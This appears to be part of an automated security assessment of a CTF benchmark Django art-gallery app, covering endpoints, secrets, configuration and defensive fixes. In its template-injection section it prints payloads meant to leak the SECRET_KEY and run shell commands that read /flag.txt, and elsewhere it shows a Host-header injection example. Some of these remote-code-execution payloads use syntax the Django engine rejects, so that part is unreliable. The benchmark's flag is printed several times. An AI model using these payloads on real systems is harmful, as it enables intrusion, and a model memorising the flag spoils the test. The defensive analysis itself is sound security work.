- **Email Validation:** Standard Django EmailField (regex-based, does not verify deliverability)
- **No Email Verification:** No confirmation email sent, no verification token
- **Session State Dependency:** Relies on session from step 1 (potential session manipulation)
- **Disposable Email Allowed:** No filtering of disposable/temporary email services
- **No Domain Whitelist:** Accepts any email domain

**Session Guard (Lines 23-24):**
```python
if 'name' not in request.session:
    return redirect('register_step1')
```

This only checks key existence, not session integrity. If an attacker can inject keys into another user's session, they could bypass step 1.

#### **Endpoint 4: Registration Step 3 - CRITICAL VULNERABILITY**

**Route:** `/accounts/register/step3/`  
**HTTP Method:** GET, POST  
**Authentication Required:** No (session guard requires 'name' and 'email' in session)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 35-58

**Input Parameters:**
- `is_premium`: BooleanField (checkbox, optional, default False)

**CRITICAL VULNERABILITY - Server-Side Template Injection (SSTI):**

**Lines 53-55:**
```python
engine = engines["django"]
template_str = open('accounts/templates/accounts/register_step3.html','r').read()
template = engine.from_string(template_str.replace('ACCOUNTNAME', request.session['name']))
```

**Vulnerability Analysis:**

1. **Template File Reading:** The template file is read from disk on every request (performance issue, but also security risk as file contents are then modified)

2. **Unsafe String Replacement:** The code performs `template_str.replace('ACCOUNTNAME', request.session['name'])`, directly injecting user-controlled data into template source code

3. **Template Compilation with Injected Content:** `engine.from_string()` compiles the modified template string, executing any Django Template Language syntax present in the injected name

4. **Target Injection Point in Template:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/register_step3.html`  
**Line:** 37

```html
<script>alert("Hello ACCOUNTNAME. Just Now up to 50% OFF ")</script>
```

**Exploitation Examples:**

**Attack 1: SECRET_KEY Extraction (Flag Capture)**
```
Registration Step 1: Enter name as: {{ settings.SECRET_KEY }}
Result: Template renders as: alert("Hello flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}...")
```

**Attack 2: Remote Code Execution via Template Engine**
```
Name: {{"".__class__.__mro__[1].__subclasses__()[396]("cat /flag.txt",shell=True,stdout=-1).communicate()[0].strip()}}
```

This payload:
- Accesses Python object introspection via `__class__.__mro__`
- Navigates to subprocess.Popen class (index may vary)
- Executes shell command to read `/flag.txt`
- Returns flag content in HTTP response

**Attack 3: RCE via Template Tags**
```
Name: {% load module %}{% import os %}{{ os.system('cat /flag.txt') }}
```

**Impact Assessment:**
- **Severity:** CRITICAL (CVSS 9.8)
- **Exploitability:** HIGH (simple HTTP requests, no authentication required)
- **Impact:** Remote Code Execution, arbitrary file read, SECRET_KEY disclosure, full server compromise
- **Attack Complexity:** LOW (basic Python/Django knowledge sufficient)

**Root Cause:** Trusting user input (session data) in security-critical context (template compilation) without proper sanitization

**Secure Alternative:**
```python
# SECURE VERSION - Do not use string replacement
context = {'account_name': request.session['name']}
return render(request, 'accounts/register_step3.html', context)
```

And modify template to use variable:
```html
<script>alert("Hello {{ account_name }}. Just Now up to 50% OFF ")</script>
```

Django's auto-escaping would then protect against XSS, and template injection is prevented.

#### **Endpoint 5: Login**

**Route:** `/accounts/login/`  
**HTTP Method:** GET, POST  
**Authentication Required:** No (this is the authentication entry point)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 61-73

**Input Parameters:**
- `username`: Email address (CharField)
- `password`: Password (CharField)

**Attack Surface Assessment:**
- **Brute Force Risk:** HIGH (no rate limiting, no account lockout, no CAPTCHA)
- **Credential Stuffing:** HIGH (no protection against automated credential testing)
- **Timing Attacks:** MEDIUM (Django's authentication includes timing attack mitigation)
- **User Enumeration:** MEDIUM (different error messages may leak user existence)
- **Session Fixation:** LOW (Django generates new session ID on login)

**Security Controls Present:**
- Django's `authenticate()` function with password hashing comparison
- CSRF protection via middleware
- Session regeneration on successful login

**Missing Security Controls:**
- No rate limiting (allows unlimited login attempts)
- No progressive delays on failed attempts
- No CAPTCHA after N failed attempts
- No account lockout mechanism
- No logging of failed authentication attempts
- No multi-factor authentication (MFA)
- No IP-based blocking for brute force

**Recommendation:** Implement `django-ratelimit` or similar:
```python
from ratelimit.decorators import ratelimit

@ratelimit(key='ip', rate='5/m', method='POST')
@ratelimit(key='post:username', rate='3/m', method='POST')
def login_view(request):
    # ... existing code
```

#### **Endpoint 6: Home View**

**Route:** `/accounts/home/`  
**HTTP Method:** GET, POST  
**Authentication Required:** NO (missing @login_required decorator)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 75-76

**Functionality:** Simple redirect to gallery homepage

**Security Issue:** This endpoint is in the `/accounts/` namespace suggesting authenticated access, but lacks authentication requirement. While it only performs a redirect (no sensitive operation), inconsistent authentication patterns can lead to developer errors.

**Impact:** LOW (redirect-only, no data exposure)

#### **Endpoint 7: User Preferences**

**Route:** `/accounts/preferences/`  
**HTTP Method:** GET  
**Authentication Required:** **YES** (protected by `@login_required` decorator)  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 78-80

**Functionality:** Displays authenticated user's username (email) and premium subscription status

**Data Exposed:**
- `user.username` (email address)
- `user.is_premium` (boolean)

**Attack Surface Assessment:**
- **IDOR Risk:** NONE (displays current authenticated user only, no user ID parameter)
- **XSS Risk:** LOW (Django auto-escaping protects template variables)
- **Information Disclosure:** LOW (only user's own data displayed)
- **Privilege Escalation:** NONE (is_premium field display-only, not functional)

**Security Controls:**
- `@login_required` decorator enforces authentication
- Django's auto-escaping prevents XSS in user data display
- No user input parameters accepted

**Template File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/preferences.html`  
**Lines:** 37-38

```html
<p>Name: {{ user.username }}</p>
<p>Premium Subscriber: {{ user.is_premium }}</p>
```

#### **Endpoint 8: Logout**

**Route:** `/accounts/logout/`  
**HTTP Method:** GET (should be POST only for CSRF protection)  
**Authentication Required:** No explicit requirement  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py`  
**Lines:** 97-99

**Functionality:** Destroys current session and redirects to gallery

**Security Issue:** Logout accessible via GET request allows logout CSRF attacks. An attacker could embed `<img src="http://target.com/accounts/logout/">` in a malicious page, forcing logout of visiting users.

**Best Practice:** Logout should require POST with CSRF token:
```python
from django.views.decorators.http import require_POST

@require_POST
def logout_view(request):
    logout(request)
    return redirect('gallery')
```

#### **Endpoint 9: Static Files**

**Route Pattern:** `/static/<path>`  
**HTTP Method:** GET  
**Authentication Required:** No  
**Configuration File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Lines:** 101-106

```python
STATIC_URL = '/static/'
STATICFILES_DIRS = [os.path.join(BASE_DIR, 'static')]
STATIC_ROOT = os.path.join(BASE_DIR, 'assets')
```

**Static Files Inventory:**
- `/static/css/bootstrap.min.css` - Bootstrap CSS framework
- `/static/js/jquery-3.5.1.slim.min.js` - jQuery library
- `/static/js/popper.min.js` - Popper.js for Bootstrap
- `/static/js/bootstrap.min.js` - Bootstrap JavaScript
- `/static/img/r1.jpg` through `/static/img/r9.jpg` - Gallery images

**Attack Surface Assessment:**
- **Path Traversal Risk:** LOW (Django's static file serving includes path traversal protection)
- **Information Disclosure:** LOW (standard frontend libraries, no sensitive files)
- **Vulnerability in Libraries:** POTENTIAL (jQuery 3.5.1 and Bootstrap 4 may have known CVEs)
- **Source Code Exposure:** NONE (Python source files not in static directories)

**Library Version Analysis:**
- **jQuery 3.5.1:** Released April 2020, check for CVEs (prototype pollution vulnerabilities existed in earlier versions)
- **Bootstrap 4:** Check specific version for XSS vulnerabilities in data attributes and tooltips

**Recommendation:** Update to latest versions and implement Content Security Policy (CSP) headers to mitigate XSS even if library vulnerabilities exist.

### Internal Service Communication

**Architecture:** Two Docker containers communicate over internal Docker bridge network:

1. **art_gallery container** (Django application)
2. **db container** (MySQL 8.4 database)

**Network Configuration:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/docker-compose.yml`

```yaml
services:
  db:
    # MySQL container on internal network, port 3306 not exposed to host
  art_gallery:
    # Django container, port 80 exposed to host
    depends_on:
      - db
```

**Trust Relationship Analysis:**

**Django → MySQL Communication:**
- **Protocol:** MySQL protocol (TCP port 3306)
- **Encryption:** NONE (no TLS/SSL configured)
- **Authentication:** Username/password (root/art_gallery)
- **Network:** Internal Docker bridge (not accessible from host or external networks)
- **Trust Assumption:** Application trusts database responses without additional validation

**Security Implications:**

1. **No Network Encryption:** Database traffic sent in plaintext over Docker network. While Docker bridge networks provide isolation, any container compromise allows traffic interception.

2. **Implicit Trust:** Django implicitly trusts all data returned from MySQL. If database is compromised, malicious data could be injected into application responses.

3. **No Service Authentication Beyond Password:** No mutual TLS, no certificate-based authentication, only password-based MySQL authentication.

4. **Container-to-Container Attack Surface:** If the Django container is compromised via SSTI/RCE, attacker gains full access to MySQL using hardcoded credentials.

**Recommendation:** Implement TLS for MySQL connections:
```python
DATABASES = {
    'default': {
        # ... existing config
        'OPTIONS': {
            'ssl': {
                'ca': '/path/to/ca-cert.pem',
                'cert': '/path/to/client-cert.pem',
                'key': '/path/to/client-key.pem',
            }
        }
    }
}
```

### Input Validation Patterns

**Form-Level Validation Summary:**

**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/forms.py`

**Step1Form (Name & Password):**
```python
name = forms.CharField(label='Name', max_length=100, validators=[validate_name])
password = forms.CharField(label='Password', min_length=10, widget=forms.PasswordInput())

def validate_name(value):
    if "%" in value:
        raise ValidationError('The name cannot contain the "%" symbol.')
```

**Validation Issues:**
- ✗ Only blocks "%" character (insufficient for SSTI prevention)
- ✗ Allows `{`, `}`, `<`, `>`, `"`, `'`, and other special characters
- ✗ No length limit on password (DoS risk via extremely long passwords)
- ✗ Minimum 10 characters for password (weak, should be 12+)
- ✗ No password complexity requirements (allows "aaaaaaaaaa")

**Step2Form (Email):**
```python
email = forms.EmailField(label='Email')
```

Django's EmailField uses regex validation:
- ✓ Validates email format (user@domain.tld structure)
- ✗ No email deliverability check
- ✗ No disposable email domain blocking
- ✗ No email domain whitelist

**Step3Form (Premium Subscription):**
```python
is_premium = forms.BooleanField(label='Subscribe to premium', required=False)
```

Boolean field accepts True/False/not provided. No validation issues.

**Server-Side Validation Gaps:**

1. **No Rate Limiting:** Forms can be submitted unlimited times
2. **No CAPTCHA:** Automated form submission not prevented
3. **No Referrer Checking:** While CSRF tokens protect against cross-origin attacks, no additional origin validation
4. **Session Data Trusted:** Step 2 and 3 trust session data from step 1 without re-validation

**Output Encoding:**

Django's template auto-escaping is **ENABLED** by default, providing XSS protection for most template variables. However, the SSTI vulnerability bypasses this by executing template code before escaping occurs.

**Example Safe Output:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/preferences.html`

```html
<p>Name: {{ user.username }}</p>  <!-- Auto-escaped, XSS protected -->
```

If `user.username` contained `<script>alert(1)</script>`, Django would render:
```html
<p>Name: &lt;script&gt;alert(1)&lt;/script&gt;</p>
```

### Background Processing

**Finding:** No background job processing system detected.

**Analysis:**
- No Celery configuration or imports
- No Redis/RabbitMQ message broker setup
- No `@task` or `@periodic_task` decorators
- No async task queue system
- All requests processed synchronously in Django views

**Implication:** Application cannot perform long-running tasks without blocking HTTP responses. No background attack surface related to job queues, but also no ability to perform async operations like email sending, report generation, or data exports.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL FINDING:** All secrets are hardcoded in source code with NO proper secrets management system.

**Secret 1: Django SECRET_KEY (CTF Flag)**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Line:** 11

```python
SECRET_KEY = open('/flag.txt').read()
```

**Issues:**
- SECRET_KEY is the CTF flag itself: `flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}`
- Read from file created during Docker build with FLAG build arg
- Used for cryptographic signing (sessions, CSRF tokens, password reset tokens)
- If disclosed via SSTI or debug pages, entire application security compromised

**Source of Flag:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/.env`  
**Line:** 1

```
FLAG="flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}"
```

**Docker Build Process:**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/Dockerfile`  
**Lines:** 20-21

```dockerfile
ARG FLAG
RUN echo -n $FLAG > /flag.txt
```

The flag is passed as a build argument and written to `/flag.txt` which is then read by Django settings.

**Secret 2: Database Password**  
**Locations:**
1. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py:71`
   ```python
   'PASSWORD':'art_gallery',
   ```

2. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/mysql/Dockerfile:3`
   ```dockerfile
   ENV MYSQL_ROOT_PASSWORD=art_gallery
   ```

3. `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/docker-compose.yml:7`
   ```yaml
   healthcheck:
     test: ["CMD", "mysqladmin", "ping", "-h", "localhost", "--password=art_gallery", "-u", "root"]
   ```

**Issues:**
- Hardcoded in multiple locations (violation of DRY principle)
- Committed to version control
- Visible in Docker healthcheck commands
- No rotation mechanism
- Same password in all environments

**Secrets Management Best Practices NOT IMPLEMENTED:**
- ✗ No use of environment variables for secrets
- ✗ No secrets management service (HashiCorp Vault, AWS Secrets Manager, etc.)
- ✗ No encrypted configuration files
- ✗ No secret rotation mechanism
- ✗ Secrets committed to version control (git history contains them permanently)

**Recommended Solution:**
```python
# settings.py
import os
SECRET_KEY = os.environ.get('DJANGO_SECRET_KEY')
if not SECRET_KEY:
    raise ImproperlyConfigured('DJANGO_SECRET_KEY environment variable must be set')

DATABASES = {
    'default': {
        'PASSWORD': os.environ.get('DB_PASSWORD'),
        # ...
    }
}
```

And use Docker Compose secrets or environment files:
```yaml
services:
  art_gallery:
    environment:
      DJANGO_SECRET_KEY: ${DJANGO_SECRET_KEY}
      DB_PASSWORD: ${DB_PASSWORD}
```

### Configuration Security

**DEBUG Mode - CRITICAL MISCONFIGURATION**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Line:** 14

```python
DEBUG = True
```

**Impact of DEBUG=True in Production:**

1. **Detailed Error Pages:** When exceptions occur, Django renders full stack traces with:
   - Source code snippets showing application logic
   - Local variables and their values (may include secrets, passwords, session data)
   - Full file paths exposing directory structure
   - Database queries with parameters
   - Installed apps and middleware configuration
   - Environment variables

2. **Settings Exposure:** Debug pages can reveal settings module contents including SECRET_KEY, database credentials, API keys

3. **Static File Serving:** Django serves static files via development server (inefficient and insecure)

4. **404 Page Information Disclosure:** DEBUG=True renders all URL patterns on 404 errors, mapping entire attack surface

**Example Exploitation:**
```
1. Trigger error: POST to /accounts/register/step3/ with invalid data
2. If exception occurs, DEBUG page shows:
   - SECRET_KEY value in settings dump
   - Database password in DATABASES configuration
   - Session data in local variables
   - Full application directory structure
```

**ALLOWED_HOSTS Misconfiguration - HIGH RISK**  
**File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`  
**Line:** 16

```python
ALLOWED_HOSTS = ['*']
```

**Impact:**
- **Host Header Injection:** Application accepts any Host header value, enabling:
  - Cache poisoning attacks
  - Password reset poisoning (if password reset emails included links)
  - SSRF via Host header manipulation (if application makes requests based on Host)
  - Email header injection in password reset flows

**Exploitation Example:**
```http
GET / HTTP/1.1
Host: evil.com

Django accepts this and may generate links/redirects to evil.com
```

**Environment Separation:**

**CRITICAL ISSUE:** No environment separation. The same `settings.py` file is used for all environments with no environment-specific configuration.

**Best Practice:** Use environment-based settings:
```python
# settings.py
ENV = os.environ.get('DJANGO_ENV', 'development')

if ENV == 'production':
    DEBUG = False
    ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']
    # Production-specific settings
elif ENV == 'development':
    DEBUG = True
    ALLOWED_HOSTS = ['localhost', '127.0.0.1']
```

### External Dependencies

**Dependencies File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/requirements.txt`

```
asgiref==3.8.1
beautifulsoup4==4.12.3
Django==4.2.13
django-bootstrap4==24.3
django-templates==0.0.13
soupsieve==2.5
sqlparse==0.5.0
mysqlclient==2.2.4
```

**Dependency Security Analysis:**

**Django 4.2.13:** LTS (Long Term Support) version released June 2024. Check CVE databases for known vulnerabilities. Django 4.2.x is actively maintained with security updates.

**beautifulsoup4 4.12.3:** HTML/XML parser. Not directly exposed to user input in this application. Used by django-templates package.

**django-bootstrap4 24.3:** Bootstrap 4 integration for Django forms. Relatively recent version (2024).

**mysqlclient 2.2.4:** MySQL database driver. Check for known vulnerabilities.

**Security Recommendations:**
1. Implement dependency scanning (pip-audit, Safety, Snyk)
2. Regular dependency updates
3. Pin exact versions (already done)
4. Monitor security advisories for installed packages
5. Use requirements-dev.txt for development-only dependencies

**No External Service Dependencies Detected:**
- ✓ No payment gateways
- ✓ No email services (SMTP not configured)
- ✓ No cloud storage (S3, GCS)
- ✓ No analytics services
- ✓ No CDN integration
- ✓ No OAuth providers

This reduces external attack surface but also limits application functionality.

### Monitoring & Logging

**CRITICAL FINDING:** No logging or monitoring configured.

**Evidence:**
- No `LOGGING` configuration in settings.py
- No `import logging` statements in views.py
- No log file creation in Dockerfile
- No log aggregation setup
- No monitoring dashboards
- No alerting mechanisms

**Security Events NOT Logged:**
- ✗ Failed login attempts (brute force detection impossible)
- ✗ Successful logins (no audit trail)
- ✗ User registration events
- ✗ Password changes
- ✗ Session creation/destruction
- ✗ CSRF token validation failures
- ✗ Form validation errors
- ✗ Database errors
- ✗ 404 errors (potential reconnaissance)
- ✗ 500 errors (application failures)
- ✗ Unauthorized access attempts

**Impact:**
- **Incident Response:** Impossible to detect security breaches
- **Forensics:** No evidence of attacker activity
- **Compliance:** Violates logging requirements (GDPR, PCI-DSS, SOC 2)
- **Troubleshooting:** Cannot diagnose application issues

**Recommended Logging Configuration:**

```python
# settings.py
LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'formatters': {
        'verbose': {
            'format': '{levelname} {asctime} {module} {message}',
            'style': '{',
        },
    },
    'handlers': {
        'file': {
            'level': 'INFO',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': '/var/log/django/app.log',
            'maxBytes': 1024*1024*10,  # 10MB
            'backupCount': 5,
            'formatter': 'verbose',
        },
        'security_file': {
            'level': 'WARNING',
            'class': 'logging.handlers.RotatingFileHandler',
            'filename': '/var/log/django/security.log',
            'maxBytes': 1024*1024*10,
            'backupCount': 5,
            'formatter': 'verbose',
        },
    },
    'loggers': {
        'django': {
            'handlers': ['file'],
            'level': 'INFO',
            'propagate': True,
        },
        'django.security': {
            'handlers': ['security_file'],
            'level': 'WARNING',
            'propagate': False,
        },
    },
}
```

**Additional Recommendations:**
- Implement centralized logging (ELK stack, Splunk, CloudWatch)
- Set up real-time alerting for security events
- Create security dashboard for SOC monitoring
- Implement anomaly detection for brute force attacks
- Log retention policy (90 days minimum for compliance)

---

## 7. Overall Codebase Indexing

The Django Art Gallery application follows a standard Django project structure with clear separation between project-level configuration and application-level functionality. The codebase is intentionally simple, consisting of a single Django app (`accounts`) within a Django project (`art_gallery`), containerized using Docker Compose for multi-service orchestration. The directory structure adheres to Django conventions with minimal customization, making it straightforward to navigate but also indicating this is likely a purpose-built CTF challenge rather than a production-evolved application.

The root directory contains typical containerization and deployment artifacts including `docker-compose.yml` for service orchestration, separate Dockerfiles for the application and database containers, and environment configuration in `.env`. The presence of `benchmark.json` and `.xben_build_done` marker file confirms this is a structured security assessment environment with automated build tooling, likely part of a larger penetration testing or CTF platform infrastructure.

Within the `app/` directory, the Django application follows the MTV (Model-Template-View) architecture. The `art_gallery/` subdirectory serves as both the Django project root (containing `manage.py`) and the project configuration package (containing `settings.py`, `urls.py`, `wsgi.py`, `asgi.py`). This dual role is standard Django practice. The single `accounts/` application contains all user-facing functionality organized into models, views, forms, URL routing, and templates—demonstrating a monolithic application design rather than microservices.

The template system uses a two-tier approach with a global `templates/base.html` providing the base template structure, and app-specific templates in `accounts/templates/accounts/` extending this base. This inheritance pattern is Django best practice, though the small size of the application makes this organizational structure somewhat over-engineered. The static files directory contains standard frontend dependencies (Bootstrap 4, jQuery 3.5.1) and gallery images, indicating a traditional server-rendered web application rather than a single-page application (SPA) architecture.

Security-relevant patterns emerge from the codebase structure: the multi-step registration flow spread across three separate view functions suggests deliberate architectural complexity, which combined with session state management creates the attack surface for the SSTI vulnerability. The absence of a `management/commands/` directory indicates no custom Django management commands, and the lack of `tests/` directories reveals no automated testing infrastructure—both concerning from a security and code quality perspective. The simple dependency manifest (`requirements.txt` with only 8 packages) confirms minimal external dependencies, reducing third-party supply chain risk but also indicating limited functionality.

From a discoverability perspective, security-critical components are concentrated in three files: `settings.py` (configuration vulnerabilities), `views.py` (SSTI vulnerability and authentication logic), and `forms.py` (input validation weaknesses). The template files in `accounts/templates/accounts/` are also security-critical due to the dynamic template generation vulnerability. The absence of middleware customization, signals, context processors, or template tags indicates this is a deliberately minimal implementation focused on creating specific vulnerabilities rather than a full-featured application. Build orchestration uses standard Docker Compose with a custom `wait-for-it.sh` script ensuring database readiness before application startup—a common pattern in containerized environments but one that exposes timing information about service dependencies.

---

## 8. Critical File Paths

This section catalogs all security-relevant file paths referenced in the analysis above, organized by functional category. These paths are provided for subsequent manual review by security analysts and exploitation agents.

### Configuration Files

**Django Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py` - **CRITICAL:** Contains SECRET_KEY (flag), DEBUG=True, ALLOWED_HOSTS=['*'], database credentials, session settings, middleware configuration, password validators

**Docker & Orchestration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/docker-compose.yml` - Service definitions, database password in healthcheck, port mappings, container dependencies
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/Dockerfile` - **CRITICAL:** Application container definition, FLAG ARG, /flag.txt creation (line 21), Django development server command
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/mysql/Dockerfile` - Database container, root password environment variable

**Environment & Secrets:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/.env` - Contains CTF flag: `flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}`
- `/flag.txt` (inside container) - Flag file read by Django SECRET_KEY

**Build Tools:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/Makefile` - Build automation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/wait-for-it.sh` - Database readiness script
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/benchmark.json` - CTF benchmark metadata

### Authentication & Authorization

**View Functions:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py` - **CRITICAL:** Contains SSTI vulnerability (lines 53-55), plaintext password in session (line 15), all authentication endpoints

**Models:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/models.py` - Custom Account user model extending AbstractUser, is_premium field, unique name field

**Forms & Validation:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/forms.py` - Input validation, validate_name function (insufficient SSTI protection), Step1Form, Step2Form, Step3Form

### API & Routing

**URL Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/urls.py` - Root URL routing, includes accounts.urls
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/urls.py` - Application URL patterns, registration endpoints, login, logout, preferences

**WSGI/ASGI Entry Points:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/wsgi.py` - WSGI application
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/asgi.py` - ASGI application (not used)

### Data Models & DB Interaction

**Models:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/models.py` - Account model with is_premium and name fields

**Migrations:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/migrations/__init__.py` - Migrations package (no custom migrations found)

**Admin Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/admin.py` - Django admin configuration

### Dependency Manifests

- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/requirements.txt` - Python dependencies: Django 4.2.13, mysqlclient 2.2.4, beautifulsoup4, django-bootstrap4, etc.

### Sensitive Data & Secrets Handling

**Secrets:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py` (Line 11) - SECRET_KEY reads from /flag.txt
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py` (Line 71) - Hardcoded database password
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/.env` - Flag storage

**Session Data:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/views.py` (Line 15) - Plaintext password stored in session

### Middleware & Input Validation

**Middleware Configuration:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py` (Lines 32-40) - Middleware stack: SecurityMiddleware, SessionMiddleware, CsrfViewMiddleware, AuthenticationMiddleware, XFrameOptionsMiddleware

**Input Validation:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/forms.py` (Lines 6-8) - validate_name function blocking "%" only

### Logging & Monitoring

**Finding:** No logging configuration files exist. Logging must be added to `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py`

### Infrastructure & Deployment

**Container Definitions:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/docker-compose.yml` - Service orchestration, health checks, port mappings
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/Dockerfile` - Application container with FLAG ARG
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/mysql/Dockerfile` - Database container with hardcoded credentials

**Deployment Scripts:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/wait-for-it.sh` - Database readiness checker

**Static Files:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/static/css/bootstrap.min.css` - Bootstrap CSS
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/static/js/jquery-3.5.1.slim.min.js` - jQuery
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/static/js/bootstrap.min.js` - Bootstrap JS
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/static/img/r1.jpg` through `r9.jpg` - Gallery images

### CTF Flag Storage

**Primary Flag Locations:**
- `/flag.txt` (inside art_gallery container) - **PRIMARY TARGET:** Flag file created during Docker build
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/.env` (Line 1) - Flag source: `FLAG="flag{f53780ad-f388-4624-a9a6-fe1f2b97f47e}"`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/Dockerfile` (Lines 20-21) - Flag written to /flag.txt via ARG
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/art_gallery/settings.py` (Line 11) - Flag loaded as SECRET_KEY

### Templates (SSTI Vulnerability)

**Vulnerable Template:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/register_step3.html` - **CRITICAL:** SSTI injection target, line 37 contains ACCOUNTNAME placeholder

**Other Templates:**
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/templates/base.html` - Base template with Bootstrap structure
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/gallery.html` - Gallery view, authentication checks
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/login.html` - Login form
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/preferences.html` - User preferences, displays username and is_premium
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/register_step1.html` - Registration step 1
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/register_step2.html` - Registration step 2
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-056-24/app/art_gallery/accounts/templates/accounts/registration_complete.html` - Registration success page

---

## 9. XSS Sinks and Render Contexts

### Network Surface Focus Confirmation

This analysis focuses exclusively on network-accessible web application pages and publicly facing components. All identified sinks are in endpoints reachable via HTTP requests to the deployed Django application on port 80. No local-only scripts, build tools, developer utilities, or non-network surfaces are included.

### Critical Finding: Server-Side Template Injection (SSTI) → XSS

